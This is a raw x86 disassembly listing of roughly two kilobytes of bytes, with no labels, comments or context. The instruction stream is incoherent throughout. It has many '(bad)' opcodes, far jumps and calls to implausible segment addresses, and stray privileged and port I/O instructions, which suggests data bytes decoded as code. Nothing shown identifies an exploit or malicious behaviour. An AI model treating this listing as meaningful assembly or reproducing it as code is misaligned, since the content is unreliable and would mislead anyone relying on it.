  437ad4:	ja     0x437b10
  437ad6:	mov    ebp,0xb8aaba17
  437adb:	je     0x437a64
  437add:	ja     0x437b0f
  437adf:	jb     0x6aedae6b
  437ae5:	inc    edi
  437ae6:	add    al,0x36
  437ae8:	xor    ecx,esp
  437aea:	push   0x17
  437aec:	adc    BYTE PTR [edi+esi*4-0x7a],ch
  437af0:	cmp    al,0x4d
  437af2:	nop
  437af3:	bnd jmp 0x394de8aa
  437af9:	fs mov ch,0xb
  437afc:	push   edx
  437afd:	stc    
  437afe:	test   eax,0x5b6db545
  437b03:	push   esi
  437b04:	aad    0x32
  437b06:	fld    DWORD PTR [edx]
  437b08:	int    0x6c
  437b0a:	fwait
  437b0b:	push   0xa2739edb
  437b10:	retf   
  437b11:	inc    ecx
  437b12:	lea    ebp,[edx+edi*2+0x23]
  437b16:	dec    eax
  437b17:	push   esp
  437b18:	lods   eax,DWORD PTR ds:[esi]
  437b19:	pop    ebp
  437b1a:	mov    cl,0x3a
  437b1c:	test   al,0xba
  437b1e:	imul   esi,edi,0xadb61697
  437b24:	(bad)  
  437b25:	pop    ss
  437b26:	and    ch,BYTE PTR [edx+0x7a134690]
  437b2c:	inc    ebx
  437b2d:	add    al,0xb8
  437b2f:	rol    BYTE PTR [eax],1
  437b31:	adc    cl,bh
  437b33:	(bad)  
  437b34:	fadd   QWORD PTR [ebx]
  437b36:	es xor eax,0x80a22ec0
  437b3c:	pushf  
  437b3d:	xchg   BYTE PTR [edi+0x6b75b9c],dl
  437b43:	mov    edx,0xc2f4a495
  437b48:	(bad)
  437b4b:	jne    0x437b8d
  437b4d:	scas   al,BYTE PTR es:[edi]
  437b4e:	push   0xffffffaa
  437b50:	loopne 0x437b59
  437b52:	cmp    BYTE PTR [ecx+eax*8],ah
  437b55:	or     DWORD PTR [edi-0x22fbe898],ebx
  437b5b:	dec    ecx
  437b5c:	faddp  st(4),st
  437b5e:	test   DWORD PTR [ebx-0x5a],edx
  437b61:	rol    BYTE PTR [ebp+ebp*2-0x78],1
  437b65:	ret    
  437b66:	push   ebx
  437b67:	xchg   esi,eax
  437b68:	popf   
  437b69:	sti    
  437b6a:	rol    DWORD PTR [ebp+0x11],1
  437b6d:	sbb    esp,DWORD PTR [esi-0x3d]
  437b70:	or     edx,edx
  437b72:	ins    DWORD PTR es:[edi],dx
  437b73:	imul   ebx,ebx,0x46
  437b76:	enter  0xb9ea,0x2a
  437b7a:	ret    0x8fa7
  437b7d:	add    eax,0xb9b2c6c4
  437b82:	sbb    ecx,DWORD PTR [eax]
  437b84:	add    dl,dh
  437b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437b87:	int3   
  437b88:	sub    ebx,ecx
  437b8a:	mov    dh,0x2c
  437b8c:	ins    DWORD PTR es:[edi],dx
  437b8d:	xchg   ebp,eax
  437b8e:	jmp    0x7808:0x23aa56e
  437b95:	in     al,dx
  437b96:	or     BYTE PTR [edx-0x5be5f4d5],ah
  437b9c:	mov    al,ds:0x6895ba80
  437ba1:	imul   ebx,DWORD PTR [eax],0xffffffb9
  437ba4:	mov    fs,WORD PTR [eax-0x2]
  437ba7:	mov    al,ds:0x268e8d5c
  437bac:	add    dl,BYTE PTR [edi+0xfaa72f4]
  437bb2:	pop    ebx
  437bb3:	addr16 mov ds:0x2f6e,al
  437bb7:	jmp    0x437bd9
  437bb9:	push   ebp
  437bba:	push   ebx
  437bbb:	cld    
  437bbc:	add    dl,dh
  437bbe:	mov    ebx,0xbc2cbaa0
  437bc3:	jmp    0x4d88:0xda8112a
  437bca:	inc    ebp
  437bcb:	or     ebx,ecx
  437bcd:	adc    bl,al
  437bcf:	pop    es
  437bd0:	sbb    dl,cl
  437bd2:	ret    0x68d
  437bd5:	mov    cl,dl
  437bd7:	mov    cl,0xb
  437bd9:	jno    0x437c27
  437bdb:	je     0x437c2e
  437bdd:	(bad)  
  437bdf:	add    BYTE PTR [esi+0x2f],bl
  437be2:	inc    esp
  437be3:	aas    
  437be4:	dec    esp
  437be5:	adc    BYTE PTR [eax+0x63],dh
  437be8:	shl    DWORD PTR [ebx+0x1c],0x6f
  437bec:	cmp    DWORD PTR [eax],ebx
  437bee:	mov    ch,0xeb
  437bf0:	stos   BYTE PTR es:[edi],al
  437bf1:	mov    BYTE PTR [ebp-0x1b],cl
  437bf4:	and    BYTE PTR [edx+0x4402585c],ah
  437bfa:	pop    ebp
  437bfb:	mov    esi,0xa26a7c
  437c00:	sbb    al,bh
  437c02:	rol    BYTE PTR [eax],cl
  437c04:	js     0x437c20
  437c06:	loop   0x437bf2
  437c08:	or     ch,BYTE PTR [edx-0x25]
  437c0b:	adc    edi,DWORD PTR [edx+edi*8-0x44]
  437c0f:	enter  0x64ce,0x14
  437c13:	sub    eax,0x4e862d00
  437c18:	mov    eax,0x368a6536
  437c1d:	fwait
  437c1e:	or     eax,edi
  437c20:	mov    dh,0xf3
  437c22:	lock cwde 
  437c24:	push   0x35da0edb
  437c29:	sub    DWORD PTR [ecx],eax
  437c2b:	mov    dh,bl
  437c2d:	ja     0x437c15
  437c2f:	jge    0x437c9d
  437c31:	mov    bh,0x65
  437c33:	fld    DWORD PTR [ebx]
  437c35:	aaa    
  437c36:	mov    dl,ch
  437c38:	or     ebx,DWORD PTR [eax-0x43]
  437c3b:	add    ch,BYTE PTR [edx]
  437c3d:	xchg   edi,eax
  437c3e:	gs stc 
  437c40:	mov    dl,0x18
  437c42:	or     BYTE PTR [eax],al
  437c44:	cmp    ch,dl
  437c46:	push   0x8
  437c48:	fiadd  DWORD PTR [eax]
  437c4a:	push   ebp
  437c4b:	mov    ebx,DWORD PTR [eax-0x6a]
  437c4e:	pop    ebx
  437c4f:	(bad)  
  437c50:	(bad)  
  437c51:	push   ss
  437c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437c53:	fisttp DWORD PTR gs:[edx-0x73]
  437c57:	pop    esp
  437c58:	les    eax,FWORD PTR [edx]
  437c5a:	scas   al,BYTE PTR es:[edi]
  437c5b:	push   esi
  437c5c:	(bad)  
  437c5d:	pop    ss
  437c5e:	retf   0xdb55
  437c61:	aam    0x57
  437c63:	cwde   
  437c64:	sar    BYTE PTR [ecx-0x78],0xb8
  437c68:	(bad)  
  437c69:	aam    0xba
  437c6b:	jbe    0x437cd8
  437c6d:	add    cl,BYTE PTR [ebx]
  437c6f:	test   al,0x1d
  437c71:	add    eax,0xd6cbb495
  437c76:	push   ebp
  437c77:	adc    al,0x5b
  437c79:	mov    DWORD PTR [eax-0x24],ecx
  437c7c:	cmp    ebx,DWORD PTR [edi-0x58]
  437c7f:	test   eax,0xa32fcb8a
  437c84:	(bad)  
  437c85:	mov    eax,0x8da09a16
  437c8a:	lods   eax,DWORD PTR ds:[esi]
  437c8b:	dec    ecx
  437c8c:	pop    es
  437c8d:	or     DWORD PTR ds:0x3695f596,esp
  437c93:	add    ebp,ebx
  437c95:	or     BYTE PTR ds:0xe80e66ed,0x20
  437c9c:	inc    edi
  437c9d:	and    esi,DWORD PTR [edx]
  437c9f:	ins    BYTE PTR es:[edi],dx
  437ca0:	jg     0x437c73
  437ca2:	fabs   
  437ca4:	rep ins BYTE PTR es:[edi],dx
  437ca6:	ins    DWORD PTR es:[edi],dx
  437ca7:	adc    eax,DWORD PTR [eax+eax*8+0x46]
  437cab:	inc    esp
  437cac:	jge    0x437cb3
  437cae:	into   
  437caf:	push   esp
  437cb0:	fist   DWORD PTR [esi-0x75]
  437cb3:	or     al,0x63
  437cb5:	mov    dh,0xbe
  437cb7:	imul   esp,DWORD PTR [ebx],0xd965e50a
  437cbd:	outs   dx,BYTE PTR ds:[esi]
  437cbe:	add    eax,0x2e1719ba
  437cc3:	push   esp
  437cc4:	into   
  437cc5:	add    BYTE PTR [edi],bl
  437cc7:	ins    DWORD PTR es:[edi],dx
  437cc8:	jne    0x437ccb
  437cca:	xchg   edi,eax
  437ccb:	mov    BYTE PTR [eax],ch
  437ccd:	xor    BYTE PTR [edi],ah
  437ccf:	fistp  DWORD PTR [ecx]
  437cd1:	retf   
  437cd2:	add    bl,bl
  437cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437cd5:	mov    eax,0x7064164d
  437cda:	jns    0x437d0d
  437cdc:	in     al,dx
  437cdd:	test   al,0xec
  437cdf:	mov    ds:0x3c3c1762,al
  437ce4:	dec    ebp
  437ce5:	retf   0x5d7
  437ce8:	pop    ebx
  437ce9:	mov    ebx,0x8bab4344
  437cee:	adc    ecx,DWORD PTR [edi-0x36]
  437cf1:	and    eax,DWORD PTR [edx]
  437cf3:	dec    edi
  437cf4:	sbb    BYTE PTR ds:0x69f2c1,0x48
  437cfb:	inc    esi
  437cfc:	sub    al,0x28
  437cfe:	addr16 retf 0x682
  437d02:	sbb    al,0x99
  437d04:	or     al,0xa
  437d06:	test   dh,ch
  437d08:	fnstcw WORD PTR [edx]
  437d0a:	xor    BYTE PTR [esi],0xcd
  437d0d:	mov    esp,0x9f024276
  437d12:	gs pop ecx
  437d14:	xchg   esi,eax
  437d15:	and    BYTE PTR gs:[edi],bl
  437d18:	ds push esi
  437d1a:	mov    bl,0xb
  437d1c:	dec    ebp
  437d1d:	push   ecx
  437d1e:	xchg   edi,eax
  437d1f:	add    al,0x6e
  437d21:	retf   0x4cf1
  437d24:	(bad)  
  437d26:	aam    0xa7
  437d28:	lods   eax,DWORD PTR ds:[esi]
  437d29:	or     ebx,ecx
  437d2b:	pusha  
  437d2c:	lods   al,BYTE PTR ds:[esi]
  437d2d:	mov    dl,0xb2
  437d2f:	mov    bl,0x62
  437d31:	ret    0x5ae
  437d34:	ins    BYTE PTR es:[edi],dx
  437d35:	dec    ebp
  437d36:	call   0xb1b4251a
  437d3b:	mov    ecx,0xb5b2e003
  437d40:	push   ebp
  437d41:	fnstsw WORD PTR [edi-0x5153a3bc]
  437d47:	inc    ecx
  437d48:	aad    0xa2
  437d4a:	lods   eax,DWORD PTR ds:[esi]
  437d4b:	arpl   WORD PTR [ebx+eiz*2],dx
  437d4e:	mov    DWORD PTR [ebp+0x5d],edx
  437d51:	shl    DWORD PTR [esi+0x962751f],1
  437d57:	mov    BYTE PTR [eax+0x39],al
  437d5a:	(bad)  
  437d5b:	stc    
  437d5c:	mov    dh,0x94
  437d5e:	sub    BYTE PTR [edx],al
  437d60:	pop    eax
  437d61:	add    BYTE PTR [eax-0x7b],al
  437d64:	cmp    cl,BYTE PTR [edi-0x29345d5f]
  437d6a:	cmp    BYTE PTR [ebx],ch
  437d6c:	inc    ecx
  437d6d:	mov    ah,0x8c
  437d6f:	jae    0x437d6e
  437d71:	pop    es
  437d72:	mov    bh,0xb6
  437d74:	mov    dh,0x40
  437d76:	and    eax,0x3dfebf02
  437d7b:	xor    cl,cl
  437d7d:	(bad)  
  437d7f:	add    al,0x51
  437d81:	in     eax,dx
  437d82:	inc    eax
  437d83:	ins    BYTE PTR es:[edi],dx
  437d84:	sub    al,0x7f
  437d86:	inc    eax
  437d87:	(bad)  
  437d88:	adc    eax,0xd45454b4
  437d8d:	add    al,0x70
  437d8f:	fcmovu st,st(0)
  437d91:	mov    edx,0xefebdb80
  437d96:	ja     0x437d66
  437d98:	fld    TBYTE PTR [edx-0x269abffb]
  437d9e:	mov    dh,0xd
  437da0:	fisubr WORD PTR [edx+0x5c]
  437da3:	pop    eax
  437da4:	pop    edi
  437da5:	enter  0xb215,0x2c
  437da9:	pop    edi
  437daa:	xchg   esi,eax
  437dab:	stos   BYTE PTR es:[edi],al
  437dac:	enter  0x74,0xda
  437db0:	in     eax,dx
  437db1:	or     DWORD PTR [esi-0xd34777d],edi
  437db7:	in     al,0x0
  437db9:	inc    eax
  437dba:	scas   eax,DWORD PTR es:[edi]
  437dbb:	cmp    dl,dl
  437dbd:	shr    BYTE PTR [eax-0x41],1
  437dc0:	pop    ebp
  437dc1:	mov    cl,0x7a
  437dc3:	ret    0x184e
  437dc6:	mov    dl,0x8
  437dc8:	jmp    0x295b:0xa2ae7108
  437dcf:	test   BYTE PTR [edx-0x39],ah
  437dd2:	je     0x437e2a
  437dd4:	inc    eax
  437dd5:	adc    eax,0xa774b637
  437dda:	out    0x18,al
  437ddc:	out    dx,al
  437ddd:	push   esp
  437dde:	sbb    ch,BYTE PTR [eax-0xc52920]
  437de4:	jge    0x437e5f
  437de6:	in     eax,0x44
  437de8:	imul   esi,DWORD PTR [eax+0x55],0xffffffdb
  437dec:	add    eax,0x5a0451e
  437df1:	mov    al,ds:0xab9b85d4
  437df6:	sub    dl,BYTE PTR [ecx]
  437df8:	jno    0x437dc4
  437dfa:	xor    al,BYTE PTR [edi]
  437dfc:	inc    ebx
  437dfd:	ins    BYTE PTR es:[edi],dx
  437dfe:	and    dl,BYTE PTR [esi-0x44e2f867]
  437e04:	shr    DWORD PTR [eax+0x56e8a2ba],cl
  437e0a:	gs or  eax,0x8c79b97d
  437e10:	mov    DWORD PTR [ebp+0x69],ebp
  437e13:	(bad)  [ebx]
  437e15:	push   ebx
  437e16:	(bad)
  437e1a:	daa    
  437e1b:	pop    esi
  437e1c:	pop    ebp
  437e1d:	lds    ebp,FWORD PTR [ebp+0x21ad216d]
  437e23:	ins    DWORD PTR es:[edi],dx
  437e24:	xor    DWORD PTR [edx-0x67],ebp
  437e27:	mov    dh,0xf
  437e29:	ins    DWORD PTR es:[edi],dx
  437e2a:	and    BYTE PTR [edx+0x78921278],al
  437e30:	mov    ebx,cs
  437e32:	fimul  DWORD PTR [esi]
  437e34:	or     dh,BYTE PTR [esi-0x319e4019]
  437e3a:	jne    0x437e70
  437e3c:	add    eax,0xd82256e2
  437e41:	or     edi,DWORD PTR [esi+0x27]
  437e44:	lds    edx,FWORD PTR [ebp+0x19]
  437e47:	mov    dh,0x65
  437e49:	imul   eax,DWORD PTR [edx+0x18020fe8],0x2a
  437e50:	or     BYTE PTR [edx-0x26],bl
  437e53:	mov    dh,0x66
  437e55:	pop    ecx
  437e56:	xchg   DWORD PTR [eax],edi
  437e58:	jmp    0x437e7d
  437e5a:	sub    eax,0x5d10bb62
  437e5f:	push   0xffffff8a
  437e61:	adc    BYTE PTR [edi+0x5],cl
  437e64:	cmp    edi,DWORD PTR [ebx+ebp*4]
  437e67:	stos   BYTE PTR es:[edi],al
  437e68:	or     DWORD PTR [esi],esi
  437e6a:	push   esp
  437e6b:	jb     0x437ea9
  437e6d:	into   
  437e6e:	pusha  
  437e6f:	inc    eax
  437e70:	retf   
  437e71:	jbe    0x437eee
  437e73:	pusha  
  437e74:	push   esp
  437e75:	out    0xda,eax
  437e77:	retf   
  437e78:	cli    
  437e79:	lock add dl,BYTE PTR [eax-0x6bd1c1b3]
  437e80:	das    
  437e81:	ret    0xda00
  437e84:	mov    al,ds:0xff58e310
  437e89:	push   esi
  437e8a:	or     dl,BYTE PTR [ebx+eiz*2-0x14c1fd27]
  437e91:	inc    esi
  437e93:	sub    ah,BYTE PTR [eax+0x47]
  437e96:	fld    QWORD PTR [edx]
  437e98:	(bad)  
  437e99:	sub    ebp,0xdadd34e6
  437e9f:	mov    dh,0xed
  437ea1:	sbb    dh,dh
  437ea3:	mov    DWORD PTR ds:0x11640b3e,eax
  437ea9:	inc    esp
  437eaa:	das    
  437eab:	pop    esp
  437eac:	stos   BYTE PTR es:[edi],al
  437ead:	push   0x43
  437eaf:	adc    DWORD PTR [ebx-0x76],ecx
  437eb2:	cmp    al,0xdb
  437eb4:	inc    eax
  437eb5:	jne    0x437ea2
  437eb7:	clc    
  437eb8:	repnz add eax,0xd2c8b5a2
  437ebe:	pusha  
  437ebf:	add    bl,BYTE PTR [ebx+0x57]
  437ec2:	mov    al,0x7c
  437ec4:	add    BYTE PTR [eax],al
  437ec6:	loop   0x437ea5
  437ec8:	jb     0x437e95
  437eca:	repnz push cs
  437ecc:	push   ecx
  437ecd:	push   esi
  437ece:	mov    cl,0x95
  437ed0:	lea    esp,[eax-0x9fdaf01]
  437ed6:	call   esp
  437ed8:	add    bl,BYTE PTR [eax-0x4a]
  437edb:	mov    edi,0xdbaf3222
  437ee0:	mov    dh,0xb9
  437ee2:	adc    dl,BYTE PTR [edx]
  437ee4:	jno    0x437efa
  437ee6:	dec    edx
  437ee7:	add    dl,BYTE PTR [edi-0x4fbcd7dd]
  437eed:	sub    DWORD PTR [eax+0x1df60060],0xffffffec
  437ef4:	mov    DWORD PTR [eax+0x77e65bb6],eax
  437efa:	out    dx,al
  437efb:	call   0x20bcb474
  437f00:	jbe    0x437f17
  437f02:	mov    ch,0xa6
  437f04:	call   0xd0703a69
  437f09:	inc    ecx
  437f0a:	mov    cl,0xab
  437f0c:	jle    0x437f2c
  437f0e:	sub    al,0x1e
  437f10:	shr    DWORD PTR [ebx+ecx*1-0x3f],cl
  437f14:	mov    dh,0x79
  437f16:	fs jge 0x437f27
  437f19:	mov    esp,0x97c60259
  437f1e:	in     eax,0xcb
  437f20:	mov    dl,0xfc
  437f22:	xchg   esp,eax
  437f23:	jno    0x437f25
  437f25:	sub    al,dh
  437f27:	lods   al,BYTE PTR ds:[esi]
  437f28:	test   al,0x0
  437f2a:	scas   al,BYTE PTR es:[edi]
  437f2b:	gs pop ecx
  437f2d:	xchg   esi,eax
  437f2e:	out    0x60,eax
  437f30:	push   edx
  437f31:	xor    ch,bh
  437f33:	push   edx
  437f34:	xchg   esi,eax
  437f35:	gs mov ebx,0xeec2026c
  437f3b:	test   DWORD PTR [edx+eax*1+0x30],ebx
  437f3f:	push   eax
  437f40:	retf   
  437f41:	fld    TBYTE PTR [esi+0x296ef82]
  437f47:	push   esi
  437f48:	lds    eax,FWORD PTR [eax]
  437f4a:	mov    ah,0x8e
  437f4c:	jns    0x437f31
  437f4e:	mov    dl,0x6c
  437f50:	pop    esp
  437f51:	out    0x23,al
  437f53:	xchg   esp,eax
  437f54:	sub    al,0x3f
  437f56:	adc    al,0x0
  437f58:	xchg   edx,eax
  437f59:	xchg   ebp,eax
  437f5a:	outs   dx,DWORD PTR ds:[esi]
  437f5b:	xchg   edi,eax
  437f5c:	gs loop 0x437f41
  437f5f:	repnz add al,0x2
  437f62:	rol    DWORD PTR [eax],0xe2
  437f65:	jbe    0x437fbc
  437f67:	xchg   edi,eax
  437f68:	push   0x55
  437f6a:	sbb    DWORD PTR [esi+0xedbac9a],ebp
  437f70:	or     dh,BYTE PTR [esi]
  437f72:	stos   DWORD PTR es:[edi],eax
  437f73:	and    bh,BYTE PTR [edx+0x3b]
  437f76:	xor    bh,BYTE PTR [eax]
  437f78:	or     ch,ah
  437f7a:	retf   
  437f7b:	mov    dh,0x75
  437f7d:	push   eax
  437f7e:	cmp    BYTE PTR [edx],dl
  437f80:	or     BYTE PTR [edx],dl
  437f82:	mov    ecx,0x5f2e148b
  437f87:	mov    esi,0x46022e2d
  437f8c:	pusha  
  437f8d:	add    BYTE PTR [ebx+0x5e001034],al
  437f93:	sahf   
  437f94:	sub    DWORD PTR [edi],edx
  437f96:	add    BYTE PTR [ebx-0x7341d9de],bh
  437f9c:	add    BYTE PTR ds:0xbe6d01a2,cl
  437fa2:	and    DWORD PTR [ebx],ecx
  437fa4:	out    0x15,eax
  437fa6:	ins    BYTE PTR es:[edi],dx
  437fa7:	ins    BYTE PTR es:[edi],dx
  437fa8:	test   al,0x82
  437faa:	sbb    al,0x40
  437fac:	push   eax
  437fad:	jl     0x437fae
  437faf:	je     0x437fdd
  437fb1:	das    
  437fb2:	retf   
  437fb3:	mov    dl,0x7c
  437fb5:	fs pushf 
  437fb7:	xchg   esp,eax
  437fb8:	add    BYTE PTR [edx],bl
  437fba:	sbb    dh,BYTE PTR [ebp-0x6b]
  437fbd:	gs mov ebx,0xa002c03a
  437fc3:	jge    0x437f53
  437fc5:	mov    al,0xcb
  437fc7:	mov    dh,0x7d
  437fc9:	mov    al,0x2
  437fcb:	cwde   
  437fcc:	sbb    eax,0x2a67d6c
  437fd1:	into   
  437fd2:	sbb    edx,DWORD PTR [esi-0x53d06891]
  437fd8:	sbb    BYTE PTR [eax],al
  437fda:	xlat   BYTE PTR ds:[ebx]
  437fdb:	push   esp
  437fdc:	cmp    al,0x5c
  437fde:	push   esp
  437fdf:	add    BYTE PTR [esi+0x5adb06b1],al
  437fe5:	push   ebp
  437fe6:	pop    ecx
  437fe7:	ins    BYTE PTR es:[edi],dx
  437fe8:	adc    BYTE PTR [esi-0x60],0xb9
  437fec:	test   eax,0x59b4b82
  437ff1:	inc    BYTE PTR ds:0xb6bd488f
  437ff7:	xor    eax,0x51f6b441
  437ffc:	retf   
  437ffd:	(bad)  
  437ffe:	ds retf 
  438000:	add    bl,BYTE PTR [esi+0x47fca0ea]
  438006:	push   ecx
  438007:	add    BYTE PTR [edx],bl
  438009:	jle    0x43804f
  43800b:	mov    eax,0xb750f860
  438010:	sub    al,0xdf
  438012:	add    cl,dl
  438014:	cwde   
  438015:	add    BYTE PTR [edx+0x7808d867],bh
  43801b:	in     eax,dx
  43801c:	mov    al,ds:0xf60800da
  438021:	call   0xda96:0x28d886ac
  438028:	mov    dl,0xa4
  43802a:	add    eax,0x43d105ba
  43802f:	stos   BYTE PTR es:[edi],al
  438030:	in     eax,dx
  438031:	push   esi
  438032:	fadd   DWORD PTR ds:0x43b9b2f5
  438038:	mov    esi,0x5d0d9402
  43803d:	shl    BYTE PTR [esi+0x632953ec],0x86
  438044:	std    
  438045:	out    0xdb,al
  438047:	(bad)  
  438048:	adc    eax,0x20ee400
  43804d:	inc    ebx
  43804e:	jno    0x4380cb
  438050:	ins    DWORD PTR es:[edi],dx
  438051:	mov    eax,ds:0x5f656c44
  438056:	out    dx,eax
  438057:	dec    ecx
  438058:	dec    ebp
  438059:	push   esi
  43805a:	neg    bl
  43805c:	inc    ecx
  43805d:	aad    0x50
  43805f:	int    0x9e
  438061:	cmp    cl,al
  438063:	push   0xa602651a
  438068:	mov    ds:0x8dacaea,al
  43806d:	cmp    eax,0x62a16de7
  438072:	mov    DWORD PTR [ecx+ebx*8-0x41],esi
  438076:	daa    
  438077:	xor    DWORD PTR [eax+0x6d],ebp
  43807a:	mov    ds:0x9faa6cba,al
  43807f:	(bad)  
  438080:	ds or  al,0xba
  438083:	lods   eax,DWORD PTR ds:[esi]
  438084:	pop    ecx
  438085:	mov    dh,0xdf
  438087:	mov    dl,0x2
  438089:	cmp    cl,BYTE PTR [eax]
  43808b:	sbb    DWORD PTR [edx+0x781a02a5],0x30
  438092:	pop    esp
  438093:	xchg   esi,eax
  438094:	in     eax,0x4b
  438096:	aam    0xee
  438098:	sbb    DWORD PTR [eax-0x1249a681],0x571c0a59
  4380a2:	dec    edx
  4380a3:	lock add al,dl
  4380a6:	mov    ds:0x7cb2c0d6,al
  4380ab:	jg     0x438045
  4380ad:	add    al,dl
  4380af:	mov    dl,0x1e
  4380b1:	push   ds
  4380b2:	es into 
  4380b4:	mov    dh,0x5b
  4380b6:	pop    es
  4380b7:	shl    BYTE PTR ds:0xc22fbf4f,1
  4380bd:	mov    cl,0x3e
  4380bf:	popf   
  4380c0:	retf   
  4380c1:	repnz fld DWORD PTR gs:[edx]
  4380c5:	adc    DWORD PTR [esi-0x1345ff7c],ecx
  4380cb:	cmp    DWORD PTR [esi+0x2d1535b2],ecx
  4380d1:	hlt    
  4380d2:	push   ecx
  4380d3:	mov    edi,0x7392802
  4380d8:	in     eax,0xc2
  4380da:	sbb    al,BYTE PTR [esi+0xa]
  4380dd:	js     0x438150
  4380df:	or     BYTE PTR [edx+0x22],ch
  4380e2:	push   ebx
  4380e3:	aam    0x41
  4380e5:	pop    ebp
  4380e6:	dec    edx
  4380e7:	fld    TBYTE PTR [eax-0x5f948d7b]
  4380ed:	ret    0xb36
  4380f0:	ds test al,0x94
  4380f3:	imul   ecx,DWORD PTR gs:[ebx-0x439b046a],0x366495c1
  4380fe:	push   eax
  4380ff:	fwait
  438100:	or     BYTE PTR ds:0x18bc439f,0xbb
  438107:	sbb    BYTE PTR [edx*8+0x1392000e],al
  43810e:	sbb    ah,ch
  438110:	test   al,0xcb
  438112:	(bad)  
  438113:	loope  0x43809b
  438115:	add    ch,dh
  438117:	cmp    edi,DWORD PTR [eax]
  438119:	or     esi,esi
  43811b:	sbb    BYTE PTR [eax+0x7004db6a],al
  438121:	sahf   
  438122:	cs adc al,0x64
  438125:	sub    al,0xdb
  438127:	lods   eax,DWORD PTR ds:[esi]
  438128:	ins    DWORD PTR es:[edi],dx
  438129:	lods   eax,DWORD PTR ds:[esi]
  43812a:	and    al,0xc
  43812c:	add    eax,0x5f638e80
  438131:	fisttp QWORD PTR [edx-0x4d]
  438134:	sub    al,0xcb
  438136:	mov    dl,0x78
  438138:	sub    ch,dh
  43813a:	dec    edx
  43813b:	sub    BYTE PTR [edx+0x7bcb2db1],dh
  438141:	in     al,0xde
  438143:	and    esi,DWORD PTR [esi-0xd486cf4]
  438149:	or     ecx,ebx
  43814b:	and    al,0x4e
  43814d:	mov    DWORD PTR [edx-0x796dffe7],0x6d48268
  438157:	and    ch,BYTE PTR [esi]
  438159:	outs   dx,DWORD PTR ds:[esi]
  43815a:	or     esi,DWORD PTR [ecx]
  43815c:	add    BYTE PTR [edx+0x2c38ecb2],dh
  438162:	retf   
  438163:	ror    BYTE PTR [ebp+0x10204ea7],cl
  438169:	mov    edi,0x2c700000
  43816e:	retf   
  43816f:	repnz mov dl,0x70
  438172:	add    BYTE PTR [eax],0x6
  438175:	push   cs
  438176:	push   ss
  438177:	push   cs
  438178:	pop    ecx
  438179:	cs retf 
  43817b:	mov    dl,0x6
  43817d:	push   cs
  43817e:	ss push cs
  438180:	test   BYTE PTR [esp+eax*8-0x6b9a6a4e],cl
  438187:	mov    WORD PTR [ebx],cs
  438189:	jmp    0x4381e7
  43818b:	(bad)  [esi-0x7365a523]
  438191:	mov    al,BYTE PTR [ebx-0x7efabbe6]
  438197:	add    dh,BYTE PTR [esi]
  438199:	retf   
  43819a:	mov    dl,0xbc
  43819c:	sub    al,0x5c
  43819e:	or     BYTE PTR [eax],al
  4381a0:	pop    ss
  4381a1:	mov    al,0x82
  4381a3:	loop   0x43814a
  4381a5:	retf   
  4381a6:	mov    dl,0x2c
  4381a8:	aas    
  4381a9:	nop
  4381aa:	repnz mov ?,WORD PTR [edi+ebx*2-0x7757949b]
  4381b2:	jb     0x43814c
  4381b4:	aam    0x2
  4381b6:	out    dx,al
  4381b7:	mov    dl,0x35
  4381b9:	mov    bl,bh
  4381bb:	xchg   BYTE PTR [eax+0x2f88f40b],cl
  4381c1:	pop    esp
  4381c2:	jmp    0xdb703892
  4381c7:	jbe    0x43823d
  4381c9:	dec    esp
  4381ca:	and    al,0xe1
  4381cc:	or     edx,DWORD PTR [esi+0x3c]
  4381cf:	sbb    edx,0x773f4045
  4381d5:	or     al,0x9
  4381d7:	xchg   esi,eax
  4381d8:	lods   eax,DWORD PTR ds:[esi]
  4381d9:	sub    al,0xb0
  4381db:	and    cl,BYTE PTR [edi+edi*8]
  4381de:	adc    al,0xb
  4381e0:	xor    BYTE PTR [edx+0x7],dl
  4381e3:	shl    DWORD PTR [esi+0x215b25d],0xb2
  4381ea:	pop    esp
  4381eb:	or     BYTE PTR [ecx+0x2b],0xd1
  4381ef:	rep ins DWORD PTR es:[edi],dx
  4381f1:	xchg   edx,eax
  4381f2:	cmp    eax,0x82009202
  4381f7:	lock mov bl,0x8a
  4381fa:	adc    al,0xdb
  4381fc:	in     eax,0xdb
  4381fe:	ja     0x438266
  438200:	xor    BYTE PTR [ebx-0x7f93fd25],0x0
  438207:	push   ss
  438208:	ds push ecx
  43820a:	pop    esp
  43820b:	into   
  43820c:	jns    0x438207
  43820e:	repnz in eax,0x0
  438211:	les    ebp,FWORD PTR ds:[eax+eax*1+0xce791e]
  438219:	push   ds
  43821a:	mov    ah,0xfc
  43821c:	add    bh,bh
  43821e:	retf   0xb2c2
  438221:	je     0x438290
  438223:	hlt    
  438224:	mov    edi,0x14d91c04
  438229:	xchg   esi,eax
  43822a:	gs pop ecx
  43822c:	xchg   esi,eax
  43822d:	mov    edi,0xbababa9a
  438232:	mov    edx,0x5c3c3410
  438237:	call   0x11f8:0xd923d660
  43823e:	push   ebp
  43823f:	mov    dh,0x1d
  438241:	mov    eax,0x74021c7a
  438246:	ins    BYTE PTR es:[edi],dx
  438247:	retf   
  438248:	mov    bl,0xb1
  43824a:	sti    
  43824b:	xor    cx,WORD PTR [edi+eax*2]
  43824f:	rol    BYTE PTR [edx],0xf2
  438252:	dec    ebp
  438253:	mov    cl,0xd5
  438255:	mov    ch,0x92
  438257:	shl    BYTE PTR [edi+0x79],1
  43825a:	jne    0x438229
  43825c:	(bad)
  43825f:	cs mov ch,0x28
  438262:	add    eax,0x2df0793e
  438267:	imul   ecx,DWORD PTR [edi-0x27],0x76
  43826b:	adc    eax,0x509636d
  438270:	add    al,BYTE PTR [edi-0x41]
  438273:	dec    edi
  438274:	pop    ecx
  438275:	xchg   esi,eax
  438276:	xchg   edi,eax
  438277:	gs push esp
  438279:	dec    edi
  43827a:	inc    edi
  43827b:	add    cl,cl
  43827d:	leave  
  43827e:	leave  
  43827f:	jb     0x4382da
  438281:	xchg   esi,eax
  438282:	gs leave 
  438284:	leave  
  438285:	retf   0xc9c9
  438288:	dec    ebx
  438289:	xchg   esi,eax
  43828a:	gs pop ecx
  43828c:	mov    dh,0x2
  43828e:	sub    al,0x66
  438290:	push   cs
  438291:	fld    TBYTE PTR [esp+esi*2-0x3b]
  438295:	ins    DWORD PTR es:[edi],dx
  438296:	pop    ecx
  438297:	push   ss
  438298:	lds    ecx,FWORD PTR [edi+0x7bf01532]
  43829e:	fcomp  QWORD PTR [edx]
  4382a0:	or     ch,BYTE PTR [esi+0x4b]
  4382a3:	adc    eax,0xaa7acdfd
